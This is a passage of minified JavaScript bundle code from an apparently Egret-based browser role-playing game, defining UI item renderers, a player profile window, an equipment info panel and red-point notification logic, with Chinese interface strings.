__extends(e,t),e.prototype.skinComplete=function(){this.addTouchEvent(this.btnTarget,this.onTap)},e.prototype.dataChanged=function(){switch(this.imgTitle.source=this.data.title,this.lbDesc.text=""+this.data.desc,this.lbTime.textFlow=o.TextFlowMaker.generateTextFlow1(gettext("开启时间:|C:0x01FF00&T:{0}|",this.data.times)),this.exShow.text="",this.showRed.visible=!1,this.data.target[0]){case"ExperienceWin":this.showRed.visible=c.TaskCT.ins().taskRp.v;break;case"DayAndWeekTaskWin":this.showRed.visible=c.TaskCT.ins().dayTaskRed.v||c.TaskCT.ins().weekTaskRed.v;break;case"MineMainWin":d.Mine.ins().power&&(this.exShow.textFlow=o.TextFlowMaker.generateTextFlow(gettext("矿工体力：|C:{0}&T:{1}/{2}|",d.Mine.ins().power>0?n.ColorUtil.GREEN:n.ColorUtil.RED,d.Mine.ins().power,a.GlobalConfig.CaiKuangConfig.vitMax)));break;case"FBChallengePanel":this.showRed.visible=h.Fb2CT.ins().fb2Rp.v;break;case"LadderInfoPanel":if(u.Ladder.ins().challgeNum){var t=u.Ladder.ins().challgeNum>0?"2ECA22":"f3311e";this.exShow.textFlow=(new egret.HtmlTextParser).parser(gettext("剩余次数：<font color=#{0}>{1}/{2}</font>",t,u.Ladder.ins().challgeNum,a.GlobalConfig.TianTiConstConfig.maxRestoreChallengesCount))}}},e.prototype.onTap=function(t){if(this.data&&this.data.sysId&&this.data.sysId==r.SystemType.Dominate)return l.DominateWorldCT.ins().sendDominateInfo(),void win.close("PlayWayWin");var e=this.data.target,i=e[0],n=e[1];if(window[i]&&window[i].openCheck&&!window[i].openCheck()){if(this.data&&this.data.target&&"LingJingMainPanel"==this.data.target[0])return;return void win.open(p.View_BianQiang,2)}win.close("PlayWayWin"),e&&e[0]&&win.open(i,n)},e}(s.BaseItemRender);e.PlayWayItemRender=f,window.PlayWayItemRender=f,__reflect(f.prototype,"PlayWayItemRender",[]),window.PlayWayItemRender=f},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.QiyuItem=void 0;var n=i(8),o=i(5),s=i(3),a=i(11),r=i(0),l=i(20),h=i(6),u=i(64),p=i(7),d=i(35),c=i(2),f=i(27),g=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="QiyuItemSkin",e.COLOR_OPEN=4453494,e.COLOR_CLOSE=7697263,e.listArr=new eui.ArrayCollection,e.haveCount=0,e.needCount=0,e.itemName="",e}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEvent(this.btnGet,this.onClick),this.list.itemRenderer=a.ItemBase,this.list.dataProvider=this.listArr},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.updateTime(),Timer.start(1e3,0,this.updateTime,this),this.btnGet.eRp.visible=!0},e.prototype.dataChanged=function(){var t=this.data,e=r.GlobalConfig.AdventureConfig[t.id],i=r.GlobalConfig.MonstersConfig[e.monster];if(this.currentState=e.type+"",this.listArr.source=e.rewards,i&&i.head&&(this.eHead.source="monhead"+i.head+"_png",this.nameLab.text=i.name+" Lv"+i.level),1==e.type){var n=r.GlobalConfig.ItemConfig[e.cost.id];this.itemImg.source=RES_DIR_ITEMICON+n.icon+".png";var s=h.BagCT.ins().getBagGoodsCountById(h.BagCT.BAG_TYPE_OTHTER,e.cost.id),a=s>=e.cost.count?this.COLOR_OPEN:this.COLOR_CLOSE;this.itemCountLab.textFlow=o.TextFlowMaker.generateTextFlow("<font color="+this.COLOR_OPEN+">"+e.cost.count+"</font>/<font color="+a+">"+s+"</font>"),this.haveCount=s,this.needCount=e.cost.count,this.itemName=n.name}else if(2==e.type){var l=r.GlobalConfig.InstanceConfig[e.fbId];this.shuwPosLab.text=l.name?l.name+"":""}},e.prototype.updateTime=function(){var t=this.data,e=Math.floor((n.DateUtils.formatMiniDateTime(t.endTime)-p.GameServerCC.serverTime)/1e3);this.endTimeLab.text=n.DateUtils.getFormatBySecond(e,n.DateUtils.TIME_FORMAT_5,3)},e.prototype.onClick=function(t){var e=this.data,i=r.GlobalConfig.AdventureConfig[e.id];if(t.target==this.btnGet)if(1==i.type)this.haveCount>=this.needCount?d.TaskCT.ins().sendQiyuInfo(e.uid):c.TipsCT.ins().showTips(gettext("{0}不足",this.itemName));else if(2==i.type)return e.fubenID==l.GameMap.fubenID?void c.TipsCT.ins().showTips(gettext("已在当前地图")):void f.WarnWin.show(gettext("是否在地图上引导前往目标地点?"),function(){win.close("QiyuWin"),u.MainUICC.startGuide([e.fubenID])},this)},e}(s.BaseItemRender);e.QiyuItem=g,window.QiyuItem=g,__reflect(g.prototype,"QiyuItem",[]),window.QiyuItem=g},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RRoleRuneItem=e.RRoleSkillItem=e.RRoleWin=void 0;var n=i(61),o=i(1),s=i(0),a=i(3),r=i(10),l=i(5),h=i(2),u=i(93),p=i(4),d=i(12),c=i(15),f=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="RRoleWinSkin",e.currId=0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.skillList.itemRenderer=g,this.runeList.itemRenderer=m,this.skillList.dataProvider=new eui.ArrayCollection([]),this.runeList.dataProvider=new eui.ArrayCollection([]),observe(this,this.setRoleInfo,u.Friends.ins().doAddListMsg),observe(this,this.setRoleInfo,u.Friends.ins().doRemoveListMsg)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.otherPlayerData=t[0],this.nameTxt.text=this.otherPlayerData.name,this.addTouchEvent(this,this.onClick),this.setRoleInfo(),this.roleInfoPanel.addDisplay(this.otherPlayerData),this.currId=0;var i=d.OpenSystem.ins().checkSysOpen(c.SystemType.PrivateCaht);this.chatBtn.visible=i?!0:!1,this.otherPlayerData.id==p.ActorCC.actorID&&(this.chatBtn.visible=!1)},e.prototype.removeDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.closeFun&&this.closeFun()},e.prototype.setRoleInfo=function(){var t=this.otherPlayerData.roleData[0];if(t&&t.skillsData){this.roleImg.source="Role_zy"+t.job;var e="[S"+this.otherPlayerData.serverId+"]";this.otherPlayerData.serverId&&this.otherPlayerData.serverId!=n.LocationProperty.srvid||(e=""),this.nameTxt.text=this.otherPlayerData.name+e,this.skillList.dataProvider=new eui.ArrayCollection(t.skillsData),this.runeList.dataProvider=new eui.ArrayCollection(t.runeDatas),-1==u.Friends.ins().indexOfBlackList(this.otherPlayerData.id)?this.shieldBtn.label=gettext("屏蔽"):this.shieldBtn.label=gettext("取消屏蔽"),this.userData={name:this.otherPlayerData.name||"",guildName:this.otherPlayerData.guildName||"",job:t.job||0,sex:t.sex||0,vip:this.otherPlayerData.vipLevel||0,lv:t.lv||0,zsLv:this.otherPlayerData.zhuan||0,monthCard:0,power:t.power||0,appId:urlParam.appid||""}}},e.prototype.onClick=function(t){switch(t.target){case this.bgClose:win.close(this);break;case this.shieldBtn:-1==u.Friends.ins().indexOfBlackList(this.otherPlayerData.id)?u.Friends.ins().sendAddBlackList(this.otherPlayerData.id,this.userData):u.Friends.ins().sendDelete(4,this.otherPlayerData.id);break;case this.reportBtn:h.TipsCT.ins().showTips(gettext("举报成功"));break;case this.chatBtn:win.open("PrivateChatWin",this.otherPlayerData)}},e}(o.BaseView);e.RRoleWin=f,window.RRoleWin=f,__reflect(f.prototype,"RRoleWin",[]);var g=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.dataChanged=function(){var t=this.data;this.icon.source=t.icon||"",this.skillName.text=t.name||"",this.lv.text="Lv."+t.lv},e}(a.BaseItemRender);e.RRoleSkillItem=g,window.RRoleSkillItem=g,__reflect(g.prototype,"RRoleSkillItem",[]);var m=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.dataChanged=function(){var t=this.data;this.currentState=t.itemConfig?"open":"lock",this.icon=r.ItemUtil.getItemSource(t.itemConfig);var e=s.GlobalConfig.RuneNameConfig[r.ItemUtil.getSubType(t.itemConfig)],i=r.ItemUtil.getQuality2(t.itemConfig);if(!t.itemConfig)return void(this.need=l.TextFlowMaker.generateTextFlow(""));var n=t.itemConfig.id%1e3||1;this.need=l.TextFlowMaker.generateTextFlow("|C:"+r.ItemUtil.getQualityColor(i)+"&T:"+e.runeName+" Lv."+n+"|")},e}(a.BaseItemRender);e.RRoleRuneItem=m,window.RRoleRuneItem=m,__reflect(m.prototype,"RRoleRuneItem",[]),window.RRoleRuneItem=m,window.RRoleSkillItem=g,window.RRoleWin=f},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RankItemRenderer=void 0;var n=i(3),o=i(71),s=function(t){function e(){var e=t.call(this)||this;return e.touchEnabled=!0,e.touchChildren=!1,e}return __extends(e,t),e.prototype.dataChanged=function(){if(null!=this.data){this.pos.visible=!0,this.t1.visible=!1,this.pos.text=this.data.pos,this.player.text=this.data.player,this.t3.source="rank_bg"+this.itemIndex%2,this.job.source="yuanhead"+this.data.job2+"1";var t="";switch(this.data.RankType){case o.RankDataType.TYPE_POWER:t=""+this.data.power;break;case o.RankDataType.TYPE_LEVEL:t=gettext("{0}转{1}级",this.data.zhuan,this.data.level)}this.lab.text=t}this.visible=null!=this.data},e}(n.BaseItemRender);e.RankItemRenderer=s,window.RankItemRenderer=s,__reflect(s.prototype,"RankItemRenderer",[]),window.RankItemRenderer=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.AutoPrivilegeItemRender=void 0;var n=i(66),o=i(5),s=i(3),a=i(0),r=i(15),l=i(12),h=i(2),u=i(25),p=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEvent(this.btnBuy,this.onClick)},e.prototype.dataChanged=function(){this.showImg.source=this.data.img;var t=this.data.rid;this.btnBuy.label=a.GlobalConfig.RechargeConfig[t]?n.PayUtils.getPayUnitStr(a.GlobalConfig.RechargeConfig[t].cash/100,urlParam.payUnit):gettext("购买");var e=this.data.showName?this.data.showName:gettext("托管助手");this.showName.textFlow=o.TextFlowMaker.generateTextFlow(e),this.lbDesc.textFlow=o.TextFlowMaker.generateTextFlow(this.data.desc?this.data.desc:gettext("增加托管助手30天持续时间"));var i=u.Recharge.ins().AutoPrivilegeTime;if(-1==i?this.itemIndex<3?(this.btnBuy.visible=!1,this.lbGot.visible=!0):(this.btnBuy.visible=!0,this.lbGot.visible=!1):-2==i?(this.btnBuy.visible=!1,this.lbGot.visible=!0):(this.btnBuy.visible=!0,this.lbGot.visible=!1),this.data.good?this.Good.visible=!0:this.Good.visible=!1,this.itemIndex>2){var s=l.OpenSystem.ins().checkSysOpen(r.SystemType.AUTO_FIGHT_BUY);if(s)this.txt_limit.visible=!1;else{var h=a.GlobalConfig.OpenSystemConfig[r.SystemType.AUTO_FIGHT_BUY];this.txt_limit.text=gettext("服务器开启{0}天开启",h.openDay),this.txt_limit.visible=!0}}},e.prototype.onClick=function(){if(this.itemIndex>2){var t=l.OpenSystem.ins().checkSysOpen(r.SystemType.AUTO_FIGHT_BUY);if(!t){var e=a.GlobalConfig.OpenSystemConfig[r.SystemType.AUTO_FIGHT_BUY];return void h.TipsCT.ins().showTips(gettext("服务器开启{0}天后解锁高级托管，开通后可激活",e.openDay))}}var i=this.data.rid;u.Recharge.ins().sendPayOrder(i)},e}(s.BaseItemRender);e.AutoPrivilegeItemRender=p,window.AutoPrivilegeItemRender=p,__reflect(p.prototype,"AutoPrivilegeItemRender",[]),window.AutoPrivilegeItemRender=p},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.EquipDuanPoSuitWin=void 0;var n=i(1),o=i(38),s=i(494),a=function(t){function e(){var e=t.call(this)||this;return e._sn_="Suit2Skin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.listSuit.itemRenderer=s.DuanSuitItem,this._suitArr=new eui.ArrayCollection,this.listSuit.dataProvider=this._suitArr},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=o.EquipCT.ins().getDuanPoSuitList();if(i){var n=[];for(var s in i)n.push(i[s]);this._suitArr.replaceAll(n),this.lblActivite.visible=n.length<=0}else this._suitArr.replaceAll([]),this.lblActivite.visible=!0},e.prototype.removeDisplay=function(){},e}(n.BaseView);e.EquipDuanPoSuitWin=a,window.EquipDuanPoSuitWin=a,__reflect(a.prototype,"EquipDuanPoSuitWin",[]),window.EquipDuanPoSuitWin=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.DuanSuitItem=void 0;var n=i(18),o=i(5),s=i(3),a=i(0),r=i(58),l=i(38),h=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.dataChanged=function(){if(this._info=this.data,this._info&&0!=this._info.length&&this.skin){var t=this._info[0];if(this._info=this._info.sort(this.sortCfg.bind(this)),t){var e=Math.floor(t.id/1e4);this._maxCount=l.EquipCT.ins().getLimitCount(e),this.lblimit.text=gettext("最大上限：{0}",this._maxCount);var i=1e3*t.skill+1,s=a.GlobalConfig.SkillsConfig[i];if(s){var r=a.GlobalConfig.SkillsDescConfig[s.desc],h=Math.floor(t.id%1e5/1e4);this.lbSkillName.text=r?""+r.name+h:"",this.icon.source=1e3*t.skill+"_png",this.lbSkillDes.textFlow=this.getDesc();var u=l.EquipCT.ins().getSuitActiviteCnt(e);u<=this._maxCount?this.lbProgress.textFlow=o.TextFlowMaker.generateTextFlow("|C:"+n.ColorUtil.GREEN+"&T:"+u):this.lbProgress.textFlow=o.TextFlowMaker.generateTextFlow("|C:"+n.ColorUtil.RED+"&T:"+u+"/"+this._maxCount)}}}},e.prototype.sortCfg=function(t,e){return e.id-t.id},e.prototype.getDesc=function(){for(var t="",e=0,i=this._info.length;i>e;e++){var s=e<this._maxCount?n.ColorUtil.WHITE_COLOR2:n.ColorUtil.GRAY;t+=0==e?"|C:"+s+"&T:"+r.LangUtils.formatStr(this._info[e].desc,[this._info[e].value])+"|":"\n|C:"+s+"&T:"+r.LangUtils.formatStr(this._info[e].desc,[this._info[e].value])+"|"}return o.TextFlowMaker.generateTextFlow(t)},e}(s.BaseItemRender);e.DuanSuitItem=h,window.DuanSuitItem=h,__reflect(h.prototype,"DuanSuitItem",[]),window.DuanSuitItem=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.DuanPoItem=void 0;var n=i(5),o=i(3),s=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.dataChanged=function(){this._info=this.data,this._info&&this.skin&&(this.attrName.textFlow=n.TextFlowMaker.generateTextFlow(this._info.attrName),this.max.text=this._info.maxV+"",this.maxStrip.text=this._info.maxCnt+"")},e}(o.BaseItemRender);e.DuanPoItem=s,window.DuanPoItem=s,__reflect(s.prototype,"DuanPoItem",[]),window.DuanPoItem=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.EquipClearAttrItem=void 0;var n=i(3),o=i(22),s=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.dataChanged=function(){var t=this.data;t.showLock?this.lockBtn.icon=t.lockType?"Tips_sd":"Tips_js":this.lockBtn.icon="";var e=t.ts?[1,1]:t.attrQx;this.attrLab.textFlow=(new egret.HtmlTextParser).parse(o.AttributeData.getAttrShowStr(t.attr,": ",e)),this.tisheng.visible=t.ts},e}(n.BaseItemRender);e.EquipClearAttrItem=s,window.EquipClearAttrItem=s,__reflect(s.prototype,"EquipClearAttrItem",[]),window.EquipClearAttrItem=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TabQuenchingItemRender=void 0;var n=i(3),o=i(39),s=i(31),a=i(10),r=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.dataChanged=function(){var t;if(this.item.data=this.data,this.item.touchEnabled=!1,this.item.touchChildren=!1,a.ItemUtil.getType(this.data.itemConfig)==o.ItemType.TYPE_52)return this.lbBestNum.text=""+(this.data.itemConfig.jpAttr||""),void(this.lbBestNum.textColor=s.QUALITY_COLOR[this.data.quality]);if(this.data.att){var e=s.QUALITY_COLOR[this.data.quality];this.lbBestNum.textColor=e;var i=(null===(t=this.data)||void 0===t?void 0:t.getJPNum())||0;this.lbBestNum.text=i+"("+this.data.getJPPer()+"%)"}},e}(n.BaseItemRender);e.TabQuenchingItemRender=r,window.TabQuenchingItemRender=r,__reflect(r.prototype,"TabQuenchingItemRender",[]),window.TabQuenchingItemRender=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RoleInfoPanel=void 0;var n=i(1),o=i(140),s=i(38),a=i(6),r=i(96),l=i(123),h=i(0),u=i(17),p=i(62),d=i(12),c=i(15),f=i(27),g=i(118),m=i(472),v=i(26),y=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.equips=[],e.masterEquips=[],e.selectIdx=-1,e.isEquipView=!0,e.isInfoView=!1,e}return __extends(e,t),e.prototype.setOtherPlayerData=function(t){this._otherPlayerData=t,this.setRoleData(this._otherPlayerData.roleData[0])},e.prototype.setRoleData=function(t){this.role=t,this.update()},e.prototype.skinComplete=function(){this.touchEnabled=!1,this.touchChildren=!0;for(var t=0;this["item"+t];)this.equips[t]=this["item"+t],this.equips[t].touchEnabled=!0,this.equips[t].touchChildren=!1,this.equips[t].isShowTips(!1),this.addTouchEvent(this.equips[t],this.onItemClick),t++;for(t=0;this["meItem"+t];)this.masterEquips[t]=this["meItem"+t],this.masterEquips[t].touchEnabled=!0,this.masterEquips[t].touchChildren=!1,this.masterEquips[t].isShowTips(!1),this.masterEquips[t].visible=!1,this.addTouchEvent(this.masterEquips[t],this.onMasterItemClick),t++;this.addTouchEvent(this.shenFuItemIcon,this.onClick),this.addTouchEvent(this.outwardBtn,this.onClick),this.addTouchEvent(this.animals12Btn,this.onClick),this.addTouchEvent(this.btn,this.onClick),this.addTouchEvent(this.btn0,this.onClick),this.addTouchEvent(this.attrBtn,this.onClick),this.addTouchEvent(this.master,this.onClick),this.selectIcon.visible=this.selectIdx>-1,void 0==l.ShenFuCT.ins().getShenFuLv()&&l.ShenFuCT.ins().sendShenFuInfo()},e.prototype.addDisplay=function(){observe(this,this.updateShenFu,l.ShenFuCT.ins().doUpdateLv),observe(this,this.cbIdx,a.BagCT.ins().setSelectEquipIdx),observe(this,this.updataEquip,s.EquipCT.ins().postAddSpirit),observe(this,this.updataEquip,s.EquipCT.ins().postEquipChange),observe(this,this.updataEquip,g.MasterEquipCT.ins().postMasterEquipChange),observe(this,this.postForgeUpdate,r.ForgeCT.ins().postForgeUpdate),observe(this,this.updataEquip,s.EquipCT.ins().postLock),observe(this,this.updateMasterEquip,v.ZsCT.ins().postZsLv),observe(this,this.updateShenfuRed,u.RedPointBaseSys.ins().RpChange),observe(this,this.updateItemRp,u.RedPointBaseSys.ins().RpChange),this.update(),this.updateShenFu(),this.updateShenfuRed(),this.roleImg.source="Role_zy"+this.role.job,this.isEquipView=!0,this.changeEquipView()},e.prototype.cbIdx=function(t){if(s.EquipCT.ins().beforeIndex=t,this.selectIdx=t,this.btnGrp.visible=this.selectIdx<0,this.selectIdx>=0&&this.equipGrp2.visible&&(this.isEquipView=!0,this.changeEquipView()),this.selectIcon.visible=this.selectIdx>-1,this.selectIdx>-1){var e=this.equips[this.selectIdx];if(!e)return;this.selectIcon.x=e.x-(this.selectIcon.width/2-e.width/2),this.selectIcon.y=e.y-(this.selectIcon.height/2-e.height/2)}},e.prototype.update=function(){this.skin&&this.updataEquip()},e.prototype.updataEquip=function(){this.setEquip(this.role),this.updateItemRp()},e.prototype.postForgeUpdate=function(t){var e=(t[0],t[1]),i=t[2];this.setEquip(this.role),this.updateItemRp(),i&&this.equips[e].playEff()},e.prototype.updateMasterEquip=function(t){if(t){var e=d.OpenSystem.ins().checkSysOpen(c.SystemType.MasterEquip);if(e)for(var i=0;4>i;i++){var n=t.getMasterEquipByIndex(i);if(!this.masterEquips[i])return;this.masterEquips[i].visible=!0,this.masterEquips[i].setIndex(i),this.masterEquips[i].setModel(t),this.masterEquips[i].setCurRole(t.index),this.masterEquips[i].showBoostLv=!1,this.masterEquips[i].data=n,n&&0!=n.configID?this.masterEquips[i].isShowTips(!0):(this.masterEquips[i].setItemImg("xb_"+o.ForgeConst.MASTER_EQUIP_POS_TO_SUB[i]),this.masterEquips[i].isShowTips(!1))}}},e.prototype.setEquip=function(t){if(t){this.updateMasterEquip(t);var e=t.getEquipLen();if(0!=this.equips.length)for(var i=0;e>i;i++){var n=void 0;if(n=22==i||23==i?t.getEquipByIndex(i+12):t.getEquipByIndex(i),!this.equips[i])return;
if(this.equips[i].setIndex(i),this.equips[i].setModel(t),this.equips[i].setCurRole(t.index),this.equips[i].data=n.item,0==n.item.configID){if(22==i||23==i){var s=i+12;this.equips[i].setItemImg("xb_4"+s%10)}else o.ForgeConst.EQUIP_POS_TO_SUB[i]>=10?o.ForgeConst.EQUIP_POS_TO_SUB[i]>=20?this.equips[i].setItemImg("xb_3"+i%10):this.equips[i].setItemImg("xb_2"+i%10):this.equips[i].setItemImg("xb_1"+o.ForgeConst.EQUIP_POS_TO_SUB[i]);this.equips[i].isShowTips(!1)}else this.equips[i].isShowTips(!0)}}},e.prototype.onItemClick=function(t){switch(t.target){default:var e=this.equips.indexOf(t.target);if(this.isInfoView||22!=e&&23!=e||(e+=12),this.selectIdx>-1){if(e>=10){var i=this.role.getEquipByIndex(e);return void(i.item&&i.item.itemConfig?win.open("EquipDetailedWin",1,i.item.handle,i.item.itemConfig.id,i.item,this.role,this.role.index,e,8==e):win.open("RoleChooseEquipWin",this.role.index,e))}var n=s.EquipCT.ins().keepSacrifice?s.EquipCT.ins().keepSacrifice.attArr:null;return n&&0!=n.length?(a.BagCT.ins().setSelectEquipIdx(s.EquipCT.ins().beforeIndex),void f.WarnWin.show(gettext("当前{0}属性未保存，是否确认放弃?","祭炼"),function(){s.EquipCT.ins().beforeIndex=e,a.BagCT.ins().setSelectEquipIdx(s.EquipCT.ins().beforeIndex),s.EquipCT.ins().changetabEquip()},this)):(s.EquipCT.ins().beforeIndex=e,a.BagCT.ins().setSelectEquipIdx(s.EquipCT.ins().beforeIndex),void s.EquipCT.ins().changetabEquip())}if(e>-1){var i=this.role.getEquipByIndex(e);i.item&&i.item.itemConfig?win.open("EquipDetailedWin",1,i.item.handle,i.item.itemConfig.id,i.item,this.role,this.role.index,e,8==e):win.open("RoleChooseEquipWin",this.role.index,e)}}},e.prototype.onMasterItemClick=function(t){var e=this.masterEquips.indexOf(t.target);console.log(e);var i=this.role.getMasterEquipByIndex(e);i&&i.itemConfig?win.open("EquipDetailedWin",1,i.handle,i.itemConfig.id,i,this.role,this.role.index,e,8==e):win.open("RoleChooseMasterEquipWin",this.role.index,e)},e.prototype.onClick=function(t){switch(t.target){case this.shenFuItemIcon:l.ShenFuCT.ins().getShenFuLv()>0?win.open("ShenFuWin"):win.open("ShenFuTip");break;case this.master:win.open(m.MasterEquipSuitTips);break;case this.outwardBtn:if(!d.OpenSystem.ins().checkSysOpen(c.SystemType.Dress))return;win.open("DressMainWin");break;case this.animals12Btn:win.open("Animals12Win");break;case this.btn:if(!d.OpenSystem.ins().checkSysOpen(c.SystemType.RING))return;this.isEquipView=!0,this.changeEquipView();break;case this.btn0:this.isEquipView=!1,this.changeEquipView();break;case this.attrBtn:win.open("RoleAttrPanel",this.role)}},e.prototype.updateShenFu=function(){var t=l.ShenFuCT.ins().getShenFuLv(),e="Role_itemsuo";if(this.shenFuItemIcon.setItemImg(e),this.shenFuItemIcon.data=null,this.shenFuItemIcon.setStr(gettext("神符Lv.{0}",t)),t){var i=h.GlobalConfig.TalismanConfig[t];e=(null===i||void 0===i?void 0:i.icon)||"",this.shenFuItemIcon.setItemImg(""),(null===i||void 0===i?void 0:i.eff)&&this.shenFuItemIcon.setItemEff2(i.eff)}},e.prototype.updateShenfuRed=function(){this.shenFuItemIcon.setRedPoint(l.ShenFuCT.ins().upRed.v)},e.prototype.updateItemRp=function(){this.btn0.red&&(this.btn0.red.visible=s.EquipCT.ins().tjRp.v),this.animals12Btn.red&&(this.animals12Btn.red.visible=s.EquipCT.ins().animalsRp.v);for(var t=p.EquipPos.PowerRing,e=p.EquipPos.AnimalsRat,i=t;e>i;i++)this.equips[i]&&this.equips[i].redPoint&&(this.equips[i].redPoint.visible=s.EquipCT.ins().checkTjRpByPos(i));for(var n=22,o=24,i=n;o>i;i++)this.equips[i]&&this.equips[i].redPoint&&(this.equips[i].redPoint.visible=s.EquipCT.ins().checkTjRpByPos(i+12))},e.prototype.GuideSf=function(){return this.shenFuItemIcon},e.prototype.changeEquipView=function(){this.equipGrp1.visible=this.shenFuItemIcon.visible=this.isEquipView,this.equipGrp2.visible=this.master.visible=!this.isEquipView,this.shenFuItemIcon.visible=!0,this.master.visible=!1,this.btn.currentState=this.isEquipView?"down":"up",this.btn0.currentState=this.isEquipView?"up":"down"},__decorate([delayCall(100)],e.prototype,"update",null),__decorate([delayCall(100)],e.prototype,"updataEquip",null),__decorate([delayCall(100)],e.prototype,"updateShenFu",null),__decorate([delayCall(100)],e.prototype,"updateShenfuRed",null),__decorate([delayCall(100)],e.prototype,"updateItemRp",null),e}(n.BaseView);e.RoleInfoPanel=y,window.RoleInfoPanel=y,__reflect(y.prototype,"RoleInfoPanel",[]),window.RoleInfoPanel=y},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GodWingRedPoint=void 0;var n=i(14),o=i(6),s=i(13),a=i(0),r=i(39),l=i(165),h=i(99),u=i(12),p=i(15),d=function(t){function e(){var e=t.call(this)||this;return e.redPoint=!1,e.roleTabs={},e.tabs={},e.keYinRedPoint=!1,e.keYinRoles=[],observe(e,e.postGodWingRedPoint,e.postGodWingItem),observe(e,e.postGodWingItem,h.WingCC.postWingWear,h.WingCC.postGodWingData,h.WingCC.postGodWingSuitLv,Ts.wingBoost.levelup,h.WingCC.postActivate,o.BagCT.ins().postItemChange,o.BagCT.ins().postItemAdd),observe(e,e.postGodWingCompose,o.BagCT.ins().postItemChange,o.BagCT.ins().postItemAdd),observe(e,e.postKeYinRedPoint,h.WingCC.postKeYin,o.BagCT.ins().postItemCountChange,o.BagCT.ins().postItemDel,o.BagCT.ins().postItemAdd),e}return __extends(e,t),e.prototype.postKeYinRedPoint=function(){this.keYinRedPoint=!1;for(var t=0;t<s.SubRoles.ins().subRolesLen;t++){var e=this.postKeYinRoles(t);e&&(this.keYinRedPoint=!0)}return!0},e.prototype.postKeYinRoles=function(t){this.keYinRoles[t]=!1;var e=!1,i=s.SubRoles.ins().getSubRoleByIndex(t).wingsData;if(!i||i.lv<l.WingEnum.WingMaxLv)return null;var n=h.WingCC.getGodWing(t);if(!n)return null;var r=n.keYinLv,u=a.GlobalConfig.GodWingSignetLevelConfig[r+1];if(!u)return null;var p=u?o.BagCT.ins().getBagGoodsCountById(o.BagCT.BAG_TYPE_OTHTER,u.itemInfo.id):0;return p>=u.itemInfo.count&&(e=this.keYinRoles[t]=!0),e?1:null},e.prototype.postGodWingRedPoint=function(){var t=this.redPoint?1:0;this.redPoint=this.tabs[0]||this.tabs[1]||!1;var e=this.redPoint?1:0;return t==e?null:e},e.prototype.postGodWingItem=function(){var t=0;this.roleTabs[t]||(this.roleTabs[t]={});for(var e=3,i=0;e>i;i++)this.roleTabs[t]||(this.roleTabs[t]={}),this.roleTabs[t][i]=h.WingCC.isWearGodWing(i);this.tabs[t]=!1;for(var n in this.roleTabs[t])this.roleTabs[t][n]&&(this.tabs[t]=!0);return!0},e.prototype.postGodWingCompose=function(){var t=1;return this.tabs[t]=!1,this.roleTabs[t]||(this.roleTabs[t]={}),!0},e.prototype.postGodWingTransfer=function(){var t=2;this.roleTabs[t]||(this.roleTabs[t]={}),this.tabs[t]=Boolean(o.BagCT.ins().getBagGoodsByType(r.ItemType.TYPE_16))},e.prototype.getGodWingRedPoint=function(){var t=u.OpenSystem.ins().checkSysOpen(p.SystemType.Wing);if(!t)return!1;for(var e=0;e<s.SubRoles.ins().subRolesLen;e++){var i=s.SubRoles.ins().getSubRoleByIndex(e).wingsData;if(i.openStatus)return this.redPoint}return!1},__decorate([post()],e.prototype,"postKeYinRedPoint",null),__decorate([post()],e.prototype,"postKeYinRoles",null),__decorate([post()],e.prototype,"postGodWingRedPoint",null),__decorate([post()],e.prototype,"postGodWingItem",null),__decorate([post()],e.prototype,"postGodWingCompose",null),__decorate([post()],e.prototype,"postGodWingTransfer",null),e}(n.BaseSystem);e.GodWingRedPoint=d,window.GodWingRedPoint=d,__reflect(d.prototype,"GodWingRedPoint",[]),Systemap.GodWingRedPoint=function(){return d.ins()},window.GodWingRedPoint=d},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.LianTiSuitItem=void 0;var n=i(3),o=i(0),s=i(4),a=i(1141),r=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.skinComplete=function(){this.list.itemRenderer=a.LianTiLevelItem,this.list.dataProvider=this.listArr=new eui.ArrayCollection},e.prototype.dataChanged=function(){if(this.data){t.prototype.dataChanged.call(this),1==this.data?this.Titlelab.text=gettext("最低属性加成"):2==this.data&&(this.Titlelab.text=gettext("最高属性加成"));var i=[];for(var n in 